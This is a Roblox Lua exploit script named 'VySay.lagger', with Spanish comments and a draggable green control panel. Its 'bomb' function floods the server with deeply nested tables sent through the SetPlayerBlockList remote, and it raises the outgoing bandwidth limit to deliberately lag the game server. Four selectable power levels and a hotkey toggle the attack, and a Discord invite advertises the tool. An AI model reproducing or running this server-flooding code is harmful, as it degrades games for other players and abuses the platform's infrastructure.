--// VySay.lagger - PANEL VERDE GRANDE CON ASSET (380x125)
--// EFECTOS: Sombra plateada letra por letra con desvanecimiento + Estrellas animadas
--// Selector de tecla/botón personalizable (haz clic en el cuadro y pulsa la tecla deseada)

--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local ConfigFile = "VySayLaggerConfig.json"

-- ⚙️ PODER EXACTO: 23 - 32 - 70 - 90 (ULTRA)
local NIVELES = {
    Low     = { poder = 23 },
    Mid     = { poder = 32 },
    High    = { poder = 70 },
    Ultra   = { poder = 90 }
}

-- 🔑 TECLA PREDETERMINADA: M (SIEMPRE M, IGNORA LA CONFIGURACIÓN GUARDADA)
local keybind = Enum.KeyCode.M
local listeningForInput = false
local laggerActive = false
local lagThread = nil
local nivelActual = "Low"
local ventanaBloqueada = false
local isMinimized = false

-- 🎨 ESTILO VERDE
local UI_CONFIG = {
    MainBg       = Color3.fromRGB(0, 0, 0),
    TitleColor   = Color3.fromRGB(255, 255, 255),
    TextColor    = Color3.fromRGB(180, 255, 180),
    ButtonInact  = Color3.fromRGB(25, 35, 25),
    ButtonLow    = Color3.fromRGB(0, 255, 80),
    ButtonMid    = Color3.fromRGB(50, 220, 50),
    ButtonHigh   = Color3.fromRGB(0, 180, 40),
    ButtonUltra  = Color3.fromRGB(0, 255, 120),
    ToggleOff    = Color3.fromRGB(30, 45, 30),
    ToggleOn     = Color3.fromRGB(0, 200, 80),
    LockColor    = Color3.fromRGB(180, 255, 180),
    UnlockColor  = Color3.fromRGB(120, 180, 120),
    Font         = Enum.Font.GothamBlack,
    BorderColor  = Color3.fromRGB(0, 120, 40),
    GlowColor    = Color3.fromRGB(0, 255, 100),
    SelectorBg   = Color3.fromRGB(20, 40, 20),
    SelectorAct  = Color3.fromRGB(0, 255, 100),
    AccentText   = Color3.fromRGB(0, 255, 100),
}

-- 💾 CONFIG (SOLO GUARDA NIVEL Y BLOQUEO, LA TECLA SIEMPRE ES M)
local function SaveConfig()
    local data = {
        -- No guardamos Keybind para que siempre sea M
        Nivel = nivelActual,
        Bloqueado = ventanaBloqueada
    }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            -- NO SOBREESCRIBIMOS keybind, siempre se mantiene M
            nivelActual = data.Nivel or "Low"
            ventanaBloqueada = data.Bloqueado or false
        end)
    end
end
LoadConfig()

-- ⚠️ LAG ENGINE
local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
    local max = math.min(12000, poder * 50)
    for i = 1, max do table.insert(main, spam) end
    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
end

-- 🧩 ELEMENTOS
local toggleBall, toggleContainer, btnLow, btnMid, btnHigh, btnUltra, lockButton
local titleLabel, textLagger, keybindButton, toggleClick, shadowLabel, shadowGradient
local tryhardText  -- discord
local powerTip  -- recomendacion de speed

-- Funciones de actualización
local function actualizarBotonesNivel()
    -- Low
    if nivelActual == "Low" then
        btnLow.BackgroundColor3 = UI_CONFIG.ButtonLow
        btnLow.TextColor3 = Color3.fromRGB(0, 0, 0)
        btnLow.BorderSizePixel = 0
    else
        btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnLow.TextColor3 = Color3.fromRGB(200, 200, 220)
        btnLow.BorderSizePixel = 1
        btnLow.BorderColor3 = UI_CONFIG.BorderColor
    end
    
    -- Mid
    if nivelActual == "Mid" then
        btnMid.BackgroundColor3 = UI_CONFIG.ButtonMid
        btnMid.TextColor3 = Color3.fromRGB(0, 0, 0)
        btnMid.BorderSizePixel = 0
    else
        btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnMid.TextColor3 = Color3.fromRGB(200, 200, 220)
        btnMid.BorderSizePixel = 1
        btnMid.BorderColor3 = UI_CONFIG.BorderColor
    end
    
    -- High
    if nivelActual == "High" then
        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonHigh
        btnHigh.TextColor3 = Color3.fromRGB(255, 255, 255)
        btnHigh.BorderSizePixel = 0
    else
        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnHigh.TextColor3 = Color3.fromRGB(200, 200, 220)
        btnHigh.BorderSizePixel = 1
        btnHigh.BorderColor3 = UI_CONFIG.BorderColor
    end
    
    -- Ultra
    if nivelActual == "Ultra" then
        btnUltra.BackgroundColor3 = UI_CONFIG.ButtonUltra
        btnUltra.TextColor3 = Color3.fromRGB(255, 255, 255)
        btnUltra.BorderSizePixel = 0
        tryhardText.Visible = true
        tryhardText.TextColor3 = UI_CONFIG.AccentText
    else
        btnUltra.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnUltra.TextColor3 = Color3.fromRGB(200, 200, 220)
        btnUltra.BorderSizePixel = 1
        btnUltra.BorderColor3 = UI_CONFIG.BorderColor
        tryhardText.Visible = true
    end

    -- Mini texto de recomendacion
    if powerTip then
        local tips = {
            Low   = "POWER 1 · Speed: 50 / Carry: 26",
            Mid   = "POWER 2 · Speed: 43 / Carry: 22",
            High  = "POWER 3 · Speed: 35 / Carry: 18",
            Ultra = "POWER 4 · Speed: 28 / Carry: 14",
        }
        powerTip.Text = tips[nivelActual] or ""
        powerTip.Visible = true
    end
end

local function actualizarSwitch()
    if toggleContainer then
        toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
    end
    if toggleBall then
        toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
        if laggerActive then
            toggleBall.Position = UDim2.new(1, -22, 0.5, -10)
        else
            toggleBall.Position = UDim2.new(0, 3, 0.5, -10)
        end
    end
    if toggleClick then
        toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE"
        if laggerActive then
            toggleClick.TextColor3 = Color3.fromRGB(0, 255, 0)
        else
            toggleClick.TextColor3 = Color3.fromRGB(255, 0, 0)
        end
    end
end

local function actualizarCandado()
    lockButton.Text = ventanaBloqueada and "Lock" or "Unlock"
    lockButton.TextColor3 = ventanaBloqueada and Color3.fromRGB(200, 200, 220) or Color3.fromRGB(150, 150, 170)
end

local function actualizarKeybindButton()
    if keybindButton then
        local display = keybind.Name
        if display:match("Button") then
            display = display:gsub("Button", "")
        end
        keybindButton.Text = "KEY: " .. display
    end
end

local function toggleLagger()
    laggerActive = not laggerActive
    local targetPos = laggerActive and UDim2.new(1, -22, 0.5, -10) or UDim2.new(0, 3, 0.5, -10)
    TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = targetPos
    }):Play()

    toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE"
    if laggerActive then
        toggleClick.TextColor3 = Color3.fromRGB(0, 255, 0)
    else
        toggleClick.TextColor3 = Color3.fromRGB(255, 0, 0)
    end

    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.18)
            end
        end)
    else
        if lagThread then task.cancel(lagThread); lagThread = nil end
    end
end

-- 🖼️ INTERFAZ
if CoreGui:FindFirstChild("VySayLagger_UI") then CoreGui.VySayLagger_UI:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "VySayLagger_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

-- Panel
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BackgroundTransparency = 0
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(0, 180, 60)
mainFrame.Size = UDim2.new(0, 380, 0, 125)
mainFrame.Position = UDim2.new(0.12, 0, 0.5, -62)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)

-- 🌌 GRADIENTE AZUL GALAXIA
-- Background image asset
local bgImage = Instance.new("ImageLabel", mainFrame)
bgImage.Name = "BgAsset"
bgImage.BackgroundTransparency = 1
bgImage.Size = UDim2.new(1, 0, 1, 0)
bgImage.Position = UDim2.new(0, 0, 0, 0)
bgImage.Image = "rbxassetid://76067209628598"
bgImage.ImageTransparency = 0.35
bgImage.ScaleType = Enum.ScaleType.Crop
bgImage.ZIndex = 0

local gradient = Instance.new("UIGradient", mainFrame)
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 25, 10)),
    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(0, 50, 20)),
    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 90, 35)),
    ColorSequenceKeypoint.new(0.85, Color3.fromRGB(0, 140, 50)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 80))
})
gradient.Rotation = 90

-- ⭐ ESTRELLAS ANIMADAS
local stars = {}
for i = 1, 35 do
    local star = Instance.new("Frame", mainFrame)
    star.BackgroundColor3 = Color3.fromRGB(150, 255, 180)
    star.BorderSizePixel = 0
    star.Size = UDim2.new(0, 1 + math.random() * 2, 0, 1 + math.random() * 2)
    star.Position = UDim2.new(math.random(), 0, math.random(), 0)
    star.ZIndex = 1
    star.BackgroundTransparency = 0.2 + math.random() * 0.5
    
    local corner = Instance.new("UICorner", star)
    corner.CornerRadius = UDim.new(1, 0)
    
    table.insert(stars, {
        frame = star,
        transparency = star.BackgroundTransparency,
        timer = 2 + math.random() * 2,
        elapsed = 0
    })
end

-- Animación de estrellas
task.spawn(function()
    while true do
        for _, starData in ipairs(stars) do
            starData.elapsed = starData.elapsed + 0.1
            if starData.elapsed >= starData.timer then
                starData.elapsed = 0
                starData.timer = 2 + math.random() * 2
                
                local star = starData.frame
                TweenService:Create(star, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
                    BackgroundTransparency = 1
                }):Play()
                
                task.wait(0.2)
                
                star.Position = UDim2.new(math.random(), 0, math.random(), 0)
                local newSize = 1 + math.random() * 2
                star.Size = UDim2.new(0, newSize, 0, newSize)
                
                TweenService:Create(star, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
                    BackgroundTransparency = starData.transparency
                }):Play()
            end
        end
        task.wait(0.1)
    end
end)

-- ═══════════════════════════════════════════
-- TÍTULO "VySay.lagger"
-- ═══════════════════════════════════════════
titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 10, 0, 3)
titleLabel.Size = UDim2.new(0, 180, 0, 28)
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.Text = "VySay.lagger"
titleLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
titleLabel.TextSize = 18
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextYAlignment = Enum.TextYAlignment.Center
titleLabel.ZIndex = 3
titleLabel.ClipsDescendants = false

shadowLabel = Instance.new("TextLabel", mainFrame)
shadowLabel.BackgroundTransparency = 1
shadowLabel.Position = UDim2.new(0, 10, 0, 3)
shadowLabel.Size = UDim2.new(0, 180, 0, 28)
shadowLabel.Font = Enum.Font.GothamBlack
shadowLabel.Text = "VySay.lagger"
shadowLabel.TextSize = 18
shadowLabel.TextXAlignment = Enum.TextXAlignment.Left
shadowLabel.TextYAlignment = Enum.TextYAlignment.Center
shadowLabel.ZIndex = 4
shadowLabel.ClipsDescendants = true
shadowLabel.TextTransparency = 0
shadowLabel.TextColor3 = Color3.fromRGB(200, 200, 220)

shadowGradient = Instance.new("UIGradient", shadowLabel)
shadowGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 120, 40)),
    ColorSequenceKeypoint.new(0.2, Color3.fromRGB(0, 180, 60)),
    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(0, 255, 100)),
    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 180, 60)),
    ColorSequenceKeypoint.new(0.8, Color3.fromRGB(0, 120, 40)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 80, 30))
})
shadowGradient.Rotation = 0

task.spawn(function()
    while true do
        for i = 0, 1, 0.006 do
            shadowGradient.Offset = Vector2.new(i, 0)
            task.wait(0.025)
        end
    end
end)

-- ═══════════════════════════════════════════
-- TEXTO "Only for tryhards" (NUEVO)
-- ═══════════════════════════════════════════
tryhardText = Instance.new("TextLabel", mainFrame)
tryhardText.BackgroundTransparency = 1
tryhardText.Position = UDim2.new(0, 12, 0, 112)
tryhardText.Size = UDim2.new(0, 160, 0, 12)
tryhardText.Font = Enum.Font.GothamBlack
tryhardText.Text = "discord.gg/hSQ4gmg4u"
tryhardText.TextColor3 = UI_CONFIG.AccentText
tryhardText.TextSize = 10
tryhardText.TextXAlignment = Enum.TextXAlignment.Left
tryhardText.TextYAlignment = Enum.TextYAlignment.Center
tryhardText.ZIndex = 2
tryhardText.Visible = true

-- Mini tip de speed recomendado
powerTip = Instance.new("TextLabel", mainFrame)
powerTip.BackgroundTransparency = 1
powerTip.Position = UDim2.new(0, 12, 0, 68)
powerTip.Size = UDim2.new(0, 300, 0, 12)
powerTip.Font = Enum.Font.GothamBold
powerTip.Text = "POWER 1 · Speed: 50 / Carry: 26"
powerTip.TextColor3 = Color3.fromRGB(0, 255, 120)
powerTip.TextSize = 10
powerTip.TextXAlignment = Enum.TextXAlignment.Left
powerTip.TextYAlignment = Enum.TextYAlignment.Center
powerTip.ZIndex = 3
powerTip.Visible = true

-- ═══════════════════════════════════════════
-- BOTONES KEY Y LOCK
-- ═══════════════════════════════════════════
keybindButton = Instance.new("TextButton", mainFrame)
keybindButton.BackgroundColor3 = Color3.fromRGB(15, 30, 15)
keybindButton.BackgroundTransparency = 0.1
keybindButton.Position = UDim2.new(1, -168, 0, 5)
keybindButton.Size = UDim2.new(0, 58, 0, 18)
keybindButton.Font = Enum.Font.GothamBlack
keybindButton.Text = "KEY: M"
keybindButton.TextColor3 = Color3.fromRGB(180, 255, 180)
keybindButton.TextSize = 9
keybindButton.AutoButtonColor = false
keybindButton.ZIndex = 2
Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 5)
actualizarKeybindButton()

lockButton = Instance.new("TextButton", mainFrame)
lockButton.BackgroundTransparency = 0
lockButton.BackgroundColor3 = Color3.fromRGB(15, 30, 15)
lockButton.BackgroundTransparency = 0.1
lockButton.Position = UDim2.new(1, -102, 0, 5)
lockButton.Size = UDim2.new(0, 44, 0, 18)
lockButton.Font = Enum.Font.GothamBlack
lockButton.TextSize = 9
lockButton.TextColor3 = Color3.fromRGB(180, 255, 180)
lockButton.AutoButtonColor = false
lockButton.ZIndex = 2
Instance.new("UICorner", lockButton).CornerRadius = UDim.new(0, 5)
lockButton.MouseButton1Click:Connect(function()
    ventanaBloqueada = not ventanaBloqueada
    actualizarCandado()
    SaveConfig()
end)
actualizarCandado()

-- ═══════════════════════════════════════════
-- BOTONES MINIMIZAR / MAXIMIZAR
-- ═══════════════════════════════════════════
local FULL_SIZE = UDim2.new(0, 380, 0, 125)
local MIN_SIZE  = UDim2.new(0, 260, 0, 72)

local minimizeBtn = Instance.new("TextButton", mainFrame)
minimizeBtn.Name = "MinimizeBtn"
minimizeBtn.BackgroundColor3 = Color3.fromRGB(15, 30, 15)
minimizeBtn.BackgroundTransparency = 0.1
minimizeBtn.Position = UDim2.new(1, -50, 0, 5)
minimizeBtn.Size = UDim2.new(0, 22, 0, 18)
minimizeBtn.Font = Enum.Font.GothamBlack
minimizeBtn.Text = "−"
minimizeBtn.TextColor3 = Color3.fromRGB(0, 255, 100)
minimizeBtn.TextSize = 14
minimizeBtn.AutoButtonColor = false
minimizeBtn.ZIndex = 5
Instance.new("UICorner", minimizeBtn).CornerRadius = UDim.new(0, 5)

local maximizeBtn = Instance.new("TextButton", mainFrame)
maximizeBtn.Name = "MaximizeBtn"
maximizeBtn.BackgroundColor3 = Color3.fromRGB(15, 30, 15)
maximizeBtn.BackgroundTransparency = 0.1
maximizeBtn.Position = UDim2.new(1, -26, 0, 5)
maximizeBtn.Size = UDim2.new(0, 22, 0, 18)
maximizeBtn.Font = Enum.Font.GothamBlack
maximizeBtn.Text = "□"
maximizeBtn.TextColor3 = Color3.fromRGB(0, 255, 100)
maximizeBtn.TextSize = 11
maximizeBtn.AutoButtonColor = false
maximizeBtn.ZIndex = 5
Instance.new("UICorner", maximizeBtn).CornerRadius = UDim.new(0, 5)

local function setMinimized(state)
    isMinimized = state
    if state then
        -- Shrink panel
        TweenService:Create(mainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = MIN_SIZE
        }):Play()
        -- Hide content that doesn't fit in mini bar
        if textLagger then textLagger.Visible = false end
        if btnLow then btnLow.Visible = false end
        if btnMid then btnMid.Visible = false end
        if btnHigh then btnHigh.Visible = false end
        if btnUltra then btnUltra.Visible = false end
        if tryhardText then tryhardText.Visible = false end
        if powerTip then powerTip.Visible = false end
        if keybindButton then keybindButton.Visible = false end
        if lockButton then lockButton.Visible = false end
        -- Title top, larger ACTIVE/INACTIVE below
        if titleLabel then
            titleLabel.Position = UDim2.new(0, 10, 0, 4)
            titleLabel.Size = UDim2.new(0, 170, 0, 24)
            titleLabel.TextSize = 16
        end
        if shadowLabel then
            shadowLabel.Position = UDim2.new(0, 10, 0, 4)
            shadowLabel.Size = UDim2.new(0, 170, 0, 24)
            shadowLabel.TextSize = 16
        end
        if toggleContainer then
            toggleContainer.Visible = true
            toggleContainer.Position = UDim2.new(0.5, -70, 0, 34)
            toggleContainer.Size = UDim2.new(0, 140, 0, 30)
        end
        if toggleClick then
            toggleClick.TextSize = 12
        end
        if toggleBall then
            toggleBall.Size = UDim2.new(0, 24, 0, 24)
        end
        -- Min/max stay top-right
        if minimizeBtn then
            minimizeBtn.Position = UDim2.new(1, -50, 0, 5)
            minimizeBtn.Size = UDim2.new(0, 22, 0, 20)
        end
        if maximizeBtn then
            maximizeBtn.Position = UDim2.new(1, -26, 0, 5)
            maximizeBtn.Size = UDim2.new(0, 22, 0, 20)
        end
        minimizeBtn.Text = "+"
        maximizeBtn.Text = "□"
    else
        -- Restore full size
        TweenService:Create(mainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = FULL_SIZE
        }):Play()
        -- Show all content
        if textLagger then textLagger.Visible = true end
        if btnLow then btnLow.Visible = true end
        if btnMid then btnMid.Visible = true end
        if btnHigh then btnHigh.Visible = true end
        if btnUltra then btnUltra.Visible = true end
        if tryhardText then tryhardText.Visible = true end
        if powerTip then powerTip.Visible = true end
        if keybindButton then keybindButton.Visible = true end
        if lockButton then lockButton.Visible = true end
        -- Restore title
        if titleLabel then
            titleLabel.Position = UDim2.new(0, 10, 0, 3)
            titleLabel.Size = UDim2.new(0, 180, 0, 28)
            titleLabel.TextSize = 18
        end
        if shadowLabel then
            shadowLabel.Position = UDim2.new(0, 10, 0, 3)
            shadowLabel.Size = UDim2.new(0, 180, 0, 28)
            shadowLabel.TextSize = 18
        end
        -- Restore toggle position
        if toggleContainer then
            toggleContainer.Visible = true
            toggleContainer.Position = UDim2.new(1, -110, 0, 36)
            toggleContainer.Size = UDim2.new(0, 96, 0, 26)
        end
        if toggleClick then
            toggleClick.TextSize = 9
        end
        if toggleBall then
            toggleBall.Size = UDim2.new(0, 20, 0, 20)
        end
        if minimizeBtn then
            minimizeBtn.Position = UDim2.new(1, -50, 0, 5)
            minimizeBtn.Size = UDim2.new(0, 22, 0, 18)
        end
        if maximizeBtn then
            maximizeBtn.Position = UDim2.new(1, -26, 0, 5)
            maximizeBtn.Size = UDim2.new(0, 22, 0, 18)
        end
        minimizeBtn.Text = "−"
        maximizeBtn.Text = "□"
    end
end

minimizeBtn.MouseButton1Click:Connect(function()
    setMinimized(not isMinimized)
end)

maximizeBtn.MouseButton1Click:Connect(function()
    if isMinimized then
        setMinimized(false)
    else
        -- Already full: optional "pulse" or just ensure full
        setMinimized(false)
        mainFrame.Size = FULL_SIZE
    end
end)

-- ═══════════════════════════════════════════
-- "LAGGER"
-- ═══════════════════════════════════════════
textLagger = Instance.new("TextLabel", mainFrame)
textLagger.BackgroundTransparency = 1
textLagger.Position = UDim2.new(0, 10, 0, 36)
textLagger.Size = UDim2.new(0, 100, 0, 22)
textLagger.Font = Enum.Font.GothamBlack
textLagger.Text = "LAGGER"
textLagger.TextColor3 = Color3.fromRGB(180, 255, 180)
textLagger.TextSize = 14
textLagger.TextXAlignment = Enum.TextXAlignment.Left
textLagger.TextYAlignment = Enum.TextYAlignment.Center
textLagger.ZIndex = 2

-- ═══════════════════════════════════════════
-- SWITCH
-- ═══════════════════════════════════════════
toggleContainer = Instance.new("Frame", mainFrame)
toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleContainer.Position = UDim2.new(1, -110, 0, 36)
toggleContainer.Size = UDim2.new(0, 96, 0, 26)
toggleContainer.ZIndex = 2
Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1,0)

toggleBall = Instance.new("Frame", toggleContainer)
toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleBall.Size = UDim2.new(0, 20, 0, 20)
toggleBall.Position = UDim2.new(0, 2, 0.5, -10)
toggleBall.ZIndex = 2
Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1,0)

toggleClick = Instance.new("TextButton", toggleContainer)
toggleClick.BackgroundTransparency = 0
toggleClick.BackgroundColor3 = Color3.fromRGB(30, 45, 30)
toggleClick.Size = UDim2.new(1,0,1,0)
toggleClick.ZIndex = 3
toggleClick.Font = Enum.Font.GothamBlack
toggleClick.Text = "INACTIVE"
toggleClick.TextSize = 9
toggleClick.TextColor3 = Color3.fromRGB(255, 0, 0)
toggleClick.TextXAlignment = Enum.TextXAlignment.Center
toggleClick.TextYAlignment = Enum.TextYAlignment.Center
toggleClick.MouseButton1Click:Connect(toggleLagger)
toggleClick.AutoButtonColor = false
local corner = Instance.new("UICorner", toggleClick)
corner.CornerRadius = UDim.new(1,0)

-- ═══════════════════════════════════════════
-- SELECTOR DE TECLA
-- ═══════════════════════════════════════════
keybindButton.MouseButton1Click:Connect(function()
    if listeningForInput then return end
    listeningForInput = true
    keybindButton.Text = "KEY: ..."
    keybindButton.BackgroundColor3 = Color3.fromRGB(0, 180, 60)
    keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
end)

local inputConnection
inputConnection = UserInputService.InputBegan:Connect(function(input, gp)
    if not listeningForInput then return end
    if gp then return end

    local newKey = nil
    if input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    end

    if newKey then
        keybind = newKey
        actualizarKeybindButton()
        listeningForInput = false
        keybindButton.BackgroundColor3 = Color3.fromRGB(15, 30, 15)
        keybindButton.BackgroundTransparency = 0.1
        keybindButton.TextColor3 = Color3.fromRGB(200, 200, 220)
    end
end)

-- ═══════════════════════════════════════════
-- BOTONES LOW/MID/HIGH/ULTRA
-- ═══════════════════════════════════════════
local btnY = 82
local btnW = 82
local btnH = 28
local espaciado = 8
local margenIzq = 12

btnLow = Instance.new("TextButton", mainFrame)
btnLow.Size = UDim2.new(0, btnW, 0, btnH)
btnLow.Position = UDim2.new(0, margenIzq, 0, btnY)
btnLow.Font = UI_CONFIG.Font
btnLow.Text = "POWER 1"
btnLow.TextColor3 = Color3.fromRGB(200, 200, 220)
btnLow.TextSize = 10
btnLow.AutoButtonColor = false
btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
btnLow.BorderSizePixel = 1
btnLow.BorderColor3 = UI_CONFIG.BorderColor
btnLow.ZIndex = 2
Instance.new("UICorner", btnLow).CornerRadius = UDim.new(0, 6)
btnLow.MouseButton1Click:Connect(function()
    nivelActual = "Low"
    actualizarBotonesNivel()
    SaveConfig()
end)

btnMid = Instance.new("TextButton", mainFrame)
btnMid.Size = UDim2.new(0, btnW, 0, btnH)
btnMid.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, btnY)
btnMid.Font = UI_CONFIG.Font
btnMid.Text = "POWER 2"
btnMid.TextColor3 = Color3.fromRGB(200, 200, 220)
btnMid.TextSize = 10
btnMid.AutoButtonColor = false
btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
btnMid.BorderSizePixel = 1
btnMid.BorderColor3 = UI_CONFIG.BorderColor
btnMid.ZIndex = 2
Instance.new("UICorner", btnMid).CornerRadius = UDim.new(0, 6)
btnMid.MouseButton1Click:Connect(function()
    nivelActual = "Mid"
    actualizarBotonesNivel()
    SaveConfig()
end)

btnHigh = Instance.new("TextButton", mainFrame)
btnHigh.Size = UDim2.new(0, btnW, 0, btnH)
btnHigh.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, btnY)
btnHigh.Font = UI_CONFIG.Font
btnHigh.Text = "POWER 3"
btnHigh.TextColor3 = Color3.fromRGB(200, 200, 220)
btnHigh.TextSize = 10
btnHigh.AutoButtonColor = false
btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
btnHigh.BorderSizePixel = 1
btnHigh.BorderColor3 = UI_CONFIG.BorderColor
btnHigh.ZIndex = 2
Instance.new("UICorner", btnHigh).CornerRadius = UDim.new(0, 6)
btnHigh.MouseButton1Click:Connect(function()
    nivelActual = "High"
    actualizarBotonesNivel()
    SaveConfig()
end)

-- BOTÓN ULTRA (verde)
btnUltra = Instance.new("TextButton", mainFrame)
btnUltra.Size = UDim2.new(0, btnW, 0, btnH)
btnUltra.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 3, 0, btnY)
btnUltra.Font = UI_CONFIG.Font
btnUltra.Text = "POWER 4"
btnUltra.TextColor3 = Color3.fromRGB(200, 200, 220)
btnUltra.TextSize = 10
btnUltra.AutoButtonColor = false
btnUltra.BackgroundColor3 = UI_CONFIG.ButtonInact
btnUltra.BorderSizePixel = 1
btnUltra.BorderColor3 = UI_CONFIG.BorderColor
btnUltra.ZIndex = 2
Instance.new("UICorner", btnUltra).CornerRadius = UDim.new(0, 6)
btnUltra.MouseButton1Click:Connect(function()
    nivelActual = "Ultra"
    actualizarBotonesNivel()
    SaveConfig()
end)

actualizarBotonesNivel()
actualizarSwitch()

-- ARRASTRAR
local isDragging, dragStart, startPos = false, nil, nil
mainFrame.InputBegan:Connect(function(input)
    if ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if not isDragging or ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
mainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)

-- 🎮 ACTIVACIÓN CON LA TECLA SELECCIONADA
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == keybind or (input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == keybind) then
        toggleLagger()
    end
end)